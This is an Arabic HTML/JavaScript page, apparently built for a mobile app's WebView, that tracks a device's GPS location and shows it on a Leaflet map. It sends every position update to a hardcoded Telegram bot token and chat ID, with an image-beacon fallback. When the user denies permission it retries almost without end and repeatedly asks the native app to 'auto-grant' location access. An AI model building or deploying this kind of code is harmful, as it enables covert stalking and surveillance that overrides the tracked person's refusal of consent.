<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>تتبع تلقائي</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:Arial,sans-serif;direction:rtl;text-align:center;background:#f4f4f4;margin:0;padding:14px;color:#222}
h2{margin:0 0 10px;font-size:18px}
#map{height:340px;width:100%;margin:14px 0;border-radius:8px}
.badge{padding:6px 14px;border-radius:4px;margin:4px;display:inline-block;font-size:13px;background:#ff9800;color:#fff}
.ok{background:#4caf50!important}
.err{background:#f44336!important}
#status{margin:8px auto;padding:8px 12px;border-radius:6px;background:#e3f2fd;color:#0d47a1;font-size:13px;display:inline-block;max-width:100%}
.info{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:8px}
.info div{background:#fff;padding:8px 12px;border-radius:6px;box-shadow:0 2px 4px rgba(0,0,0,.1);font-size:13px;min-width:120px}
.info span{font-weight:bold;color:#0d47a1;word-break:break-all}
button{padding:10px 16px;border:none;border-radius:4px;background:#2196f3;color:#fff;font-size:14px;margin:4px}
</style>
</head>
<body>

<h2>📍 تتبع الموقع التلقائي</h2>
<div>
  <span id="secureBadge" class="badge">جارٍ الفحص…</span>
  <span id="permBadge" class="badge">جارٍ طلب الإذن…</span>
</div>
<div id="status">تهيئة…</div>

<div class="info">
  <div>خط العرض: <span id="latEl">—</span></div>
  <div>خط الطول: <span id="lngEl">—</span></div>
  <div>الدقة: <span id="accEl">—</span></div>
  <div>الارتفاع: <span id="altEl">—</span></div>
  <div>الاتجاه: <span id="headEl">—</span></div>
  <div>السرعة: <span id="speedEl">—</span></div>
  <div>الوقت: <span id="timeEl">—</span></div>
</div>

<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
(function(){
'use strict';

/* ========== إعدادات ========== */
var CONFIG = {
  botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s',
  chatId:   '6837315281',
  enableTelegram: true,
  minDistance: 10,
  minInterval: 20000,
  maxRetries: 999,        // إعادة محاولة لا نهائية حتى يُمنح الإذن
  retryDelay: 1200,
  mapZoom: 17
};

function $(id){return document.getElementById(id);}
var latEl=$('latEl'),lngEl=$('lngEl'),accEl=$('accEl'),altEl=$('altEl'),
    headEl=$('headEl'),speedEl=$('speedEl'),timeEl=$('timeEl'),
    secureBadge=$('secureBadge'),permBadge=$('permBadge'),
    statusBar=$('status');

function setStatus(msg,bg){
  statusBar.textContent=msg;
  statusBar.style.background=bg||'#e3f2fd';
  statusBar.style.color=(bg==='#ffebee')?'#b71c1c':'#0d47a1';
}

/* ========== جسر التواصل مع التطبيق الأصلي ========== */
var Bridge={
  rn: !!(window.ReactNativeWebView&&window.ReactNativeWebView.postMessage),
  and: !!(window.Android&&typeof window.Android.postMessage==='function'),
  post:function(type,data){
    var p=JSON.stringify({type:type,data:data||{},ts:Date.now()});
    try{
      if(this.rn) window.ReactNativeWebView.postMessage(p);
      else if(this.and) window.Android.postMessage(p);
      else console.log('[Bridge]',p);
    }catch(e){}
  }
};

/* ========== فحص السياق ========== */
var proto=location.protocol, host=location.hostname;
var isLocal = proto==='file:'||proto==='content:'||proto==='about:'||
              proto==='data:'||host==='localhost'||host==='127.0.0.1'||host==='';
var isSecure = proto==='https:'||isLocal;

if(isSecure){
  secureBadge.textContent='سياق آمن ✓';
  secureBadge.classList.add('ok');
}else{
  secureBadge.textContent='يجب HTTPS أو WebView محلي';
  secureBadge.classList.add('err');
}

/* ========== الخريطة ========== */
var map=null,marker=null,circle=null,mapReady=false;

function initMap(){
  try{
    map=L.map('map').setView([15.3694,44.1910],6);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
      maxZoom:19,attribution:'© OSM'
    }).addTo(map);
    mapReady=true;
    setTimeout(function(){if(map)map.invalidateSize();},400);
  }catch(e){console.error('map:',e);}
}

function updateMap(lat,lng,acc){
  if(!mapReady)return;
  var p=[lat,lng];
  if(!marker)marker=L.marker(p).addTo(map); else marker.setLatLng(p);
  if(!circle)circle=L.circle(p,{radius:acc||30}).addTo(map);
  else{circle.setLatLng(p);circle.setRadius(acc||30);}
  map.setView(p,CONFIG.mapZoom);
}

/* ========== أدوات ========== */
function fmt(n,d){return(n==null||isNaN(n))?'—':Number(n).toFixed(d==null?6:d);}
function dist(la1,lo1,la2,lo2){
  var R=6371000,r=function(x){return x*Math.PI/180;};
  var dLa=r(la2-la1),dLo=r(lo2-lo1);
  var a=Math.sin(dLa/2)*Math.sin(dLa/2)+
        Math.cos(r(la1))*Math.cos(r(la2))*
        Math.sin(dLo/2)*Math.sin(dLo/2);
  return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
}

/* ========== عرض الموقع ========== */
var lastSent={lat:null,lng:null,time:0};

function showPosition(pos){
  var c=pos.coords;
  latEl.textContent=fmt(c.latitude);
  lngEl.textContent=fmt(c.longitude);
  accEl.textContent=c.accuracy?Math.round(c.accuracy)+' م':'—';
  altEl.textContent=(c.altitude!=null)?Math.round(c.altitude)+' م':'—';
  headEl.textContent=(c.heading!=null&&!isNaN(c.heading))?Math.round(c.heading)+'°':'—';
  speedEl.textContent=(c.speed!=null)?Number(c.speed).toFixed(2)+' م/ث':'—';
  timeEl.textContent=new Date(pos.timestamp).toLocaleString('ar');

  updateMap(c.latitude,c.longitude,c.accuracy||30);

  permBadge.textContent='تم منح الإذن ✓';
  permBadge.className='badge ok';
  setStatus('✓ الموقع محدَّث تلقائيًا','#e8f5e9');

  Bridge.post('location',{
    latitude:c.latitude,longitude:c.longitude,
    accuracy:c.accuracy||0,altitude:c.altitude,
    heading:c.heading,speed:c.speed,timestamp:pos.timestamp
  });

  sendTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
}

/* ========== إعادة محاولة تلقائية عند رفض الإذن ========== */
var retryCount=0,retryTimer=null;

function showError(err){
  var code=err&&err.code;
  var msg='خطأ غير معروف';

  if(code===1){
    msg='انتظار منح إذن الموقع تلقائيًا…';
    permBadge.textContent='بانتظار الإذن…';
    permBadge.className='badge';

    // ✅ إخبار التطبيق الأصلي بمنح الإذن تلقائيًا
    Bridge.post('request_auto_grant',{});
    Bridge.post('permission_denied',{code:1});

    // ✅ إعادة المحاولة تلقائيًا بلا توقف
    if(retryCount<CONFIG.maxRetries){
      retryCount++;
      setStatus('إعادة محاولة تلقائية رقم '+retryCount+'…');
      clearTimeout(retryTimer);
      retryTimer=setTimeout(function(){
        tryGetOnce();
        tryWatch();
      },CONFIG.retryDelay);
      return;
    }
  }
  else if(code===2){msg='GPS غير مفعّل — انتظار…';}
  else if(code===3){msg='انتهت المدة — إعادة محاولة…';}

  permBadge.textContent='بانتظار…';
  permBadge.className='badge';
  setStatus(msg,'#ffebee');

  Bridge.post('location_error',{code:code,message:err.message});

  // إعادة محاولة دائمة
  if(code===2||code===3){
    clearTimeout(retryTimer);
    retryTimer=setTimeout(function(){tryGetOnce();tryWatch();},CONFIG.retryDelay);
  }
}

/* ========== طلب الموقع ========== */
function buildOptions(){
  return{enableHighAccuracy:true,timeout:15000,maximumAge:0};
}

function tryGetOnce(){
  if(!('geolocation'in navigator)){setStatus('غير مدعوم','#ffebee');return;}
  navigator.geolocation.getCurrentPosition(
    function(p){retryCount=0;showPosition(p);},
    showError,
    buildOptions()
  );
}

var watchId=null;
function tryWatch(){
  if(!('geolocation'in navigator))return;
  if(watchId!==null){
    try{navigator.geolocation.clearWatch(watchId);}catch(e){}
  }
  watchId=navigator.geolocation.watchPosition(
    function(p){retryCount=0;showPosition(p);},
    showError,
    buildOptions()
  );
}

/* ========== تيليجرام ========== */
function sendTelegram(lat,lng,acc){
  if(!CONFIG.enableTelegram)return;
  if(!CONFIG.botToken||!CONFIG.chatId)return;

  var now=Date.now();
  if(lastSent.lat!==null){
    var moved=dist(lastSent.lat,lastSent.lng,lat,lng);
    if(moved<CONFIG.minDistance&&(now-lastSent.time)<CONFIG.minInterval)return;
  }
  lastSent={lat:lat,lng:lng,time:now};

  var msg='📍 الموقع:\nخط العرض: '+lat+'\nخط الطول: '+lng+
          '\nالدقة: '+acc+' م\n'+new Date().toLocaleString('ar')+
          '\nhttps://www.google.com/maps?q='+lat+','+lng;

  var url='https://api.telegram.org/bot'+CONFIG.botToken+'/sendMessage';

  try{
    fetch(url,{
      method:'POST',mode:'no-cors',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'chat_id='+encodeURIComponent(CONFIG.chatId)+
           '&text='+encodeURIComponent(msg)
    }).catch(function(){beacon(url,msg);});
  }catch(e){beacon(url,msg);}

  Bridge.post('telegram_sent',{lat:lat,lng:lng});
}

function beacon(url,msg){
  try{
    var i=new Image();
    i.src=url+'?chat_id='+encodeURIComponent(CONFIG.chatId)+
          '&text='+encodeURIComponent(msg)+'&_='+Date.now();
  }catch(e){}
}

/* ========== استقبال أوامر من التطبيق ========== */
window.addEventListener('message',function(ev){
  var raw=ev&&ev.data; if(!raw)return;
  var cmd=raw;
  if(typeof raw==='string'){try{cmd=JSON.parse(raw);}catch(e){cmd={type:raw};}}
  switch(cmd.type){
    case 'refresh_location':tryGetOnce();break;
    case 'start_watch':tryWatch();break;
    case 'stop_watch':
      if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}watchId=null;}
      break;
    case 'set_config':
      if(cmd.data){
        if(cmd.data.botToken)CONFIG.botToken=cmd.data.botToken;
        if(cmd.data.chatId)CONFIG.chatId=cmd.data.chatId;
        if(typeof cmd.data.enableTelegram==='boolean')CONFIG.enableTelegram=cmd.data.enableTelegram;
      }
      break;
  }
});

/* ========== الإقلاع التلقائي ========== */
function boot(){
  Bridge.post('webview_ready',{
    secure:isSecure,protocol:proto,
    geolocation:('geolocation'in navigator)
  });

  initMap();

  // ✅ إخبار التطبيق الأصلي فورًا بمنح الإذن تلقائيًا
  Bridge.post('request_auto_grant',{});

  // ✅ طلب فوري
  tryGetOnce();

  // ✅ مراقبة مستمرة
  tryWatch();

  // ✅ نبضة إعادة محاولة كل 3 ثوانٍ حتى النجاح
  var heartbeat=setInterval(function(){
    if(retryCount>0||latEl.textContent==='—'){
      tryGetOnce();
      tryWatch();
      Bridge.post('request_auto_grant',{});
    }else{
      // نجح → أوقف النبضة
      if(latEl.textContent!=='—')clearInterval(heartbeat);
    }
  },3000);
}

if(document.readyState==='complete'||document.readyState==='interactive'){
  setTimeout(boot,0);
}else{
  document.addEventListener('DOMContentLoaded',boot);
}

window.addEventListener('beforeunload',function(){
  if(watchId!==null){try{navigator.geolocation.clearWatch(watchId);}catch(e){}}
});

})();
</script>
</body>
</html>
